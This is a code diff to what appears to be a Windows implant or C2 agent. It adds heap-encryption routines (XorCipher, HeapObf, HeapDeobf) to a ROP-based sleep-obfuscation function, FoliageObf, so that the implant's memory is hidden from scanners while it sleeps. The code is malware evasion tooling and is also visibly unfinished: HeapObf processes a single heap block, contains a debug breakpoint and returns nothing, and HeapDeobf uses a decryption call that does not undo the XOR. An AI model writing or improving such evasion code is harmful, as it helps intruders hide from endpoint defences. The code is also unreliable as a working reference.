@@ -38,6 +38,8 @@ FUNC VOID FoliageObf(
     CONTEXT RopProtRx = { 0 };
     CONTEXT RopExit   = { 0 };
 
+    //HeapObf();
+
     Status = Instance()->Win32.NtCreateEvent( &EvtSync, EVENT_ALL_ACCESS, NULL, SynchronizationEvent, FALSE );
     if ( Status != 0x00 ) {
         //PrintErr( "NtCreateEvent", Status );
@@ -146,6 +148,8 @@ FUNC VOID FoliageObf(
     if ( Status != 0x00 ) {
         //PrintErr( "NtSignalAndWaitForSingleObject", Status );
     }
+
+    //HeapDeobf();
 
 _LeaveObf:
     if ( EvtSync ) {
@@ -263,4 +267,51 @@ FUNC VOID CfgPrivateAddressAdd(
     if ( Status != STATUS_SUCCESS ) {
         Instance()->Win32.printf( "[E] failed with status: %X", Status );
     }
+}
+
+FUNC VOID XorCipher(IN PBYTE pBinary, IN SIZE_T sSize, IN PBYTE pbKey, IN SIZE_T sKeySize) {
+    for (SIZE_T i = 0x00, j = 0x00; i < sSize; i++, j++) {
+        if (j == sKeySize)
+            j = 0x00;
+
+        if (i % 2 == 0)
+            pBinary[i] = pBinary[i] ^ pbKey[j];
+        else
+            pBinary[i] = pBinary[i] ^ pbKey[j] ^ j;
+    }
+}
+
+FUNC BOOL HeapObf( 
+    void
+) {
+    BLACKOUT_INSTANCE
+
+    PROCESS_HEAP_ENTRY HeapEntry   = { 0 };
+    BYTE               HeapKey[16] = { 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55, 0x55 };
+
+    MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );
+
+    asm( "int3" );
+
+    Instance()->Win32.HeapWalk( Instance()->Session.Heap, &HeapEntry );
+    if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
+        Instance()->Win32.printf( "[I] block %p [%d bytes]\n", HeapEntry.lpData, HeapEntry.cbData );
+        XorCipher( HeapEntry.lpData, HeapEntry.cbData, HeapKey, sizeof(HeapKey) );
+    }   
+}
+
+FUNC BOOL HeapDeobf( 
+    void
+) {
+    BLACKOUT_INSTANCE
+
+    PROCESS_HEAP_ENTRY HeapEntry = { 0 };
+
+    MmZero( &HeapEntry, sizeof( PROCESS_HEAP_ENTRY ) );
+
+    while( Instance()->Win32.HeapWalk( Instance()->Session.Heap, &HeapEntry ) ){
+        if ( HeapEntry.wFlags & PROCESS_HEAP_ENTRY_BUSY ) {
+            Instance()->Win32.SystemFunction041( HeapEntry.lpData, HeapEntry.cbData, 0 );
+        }
+    } 
 }
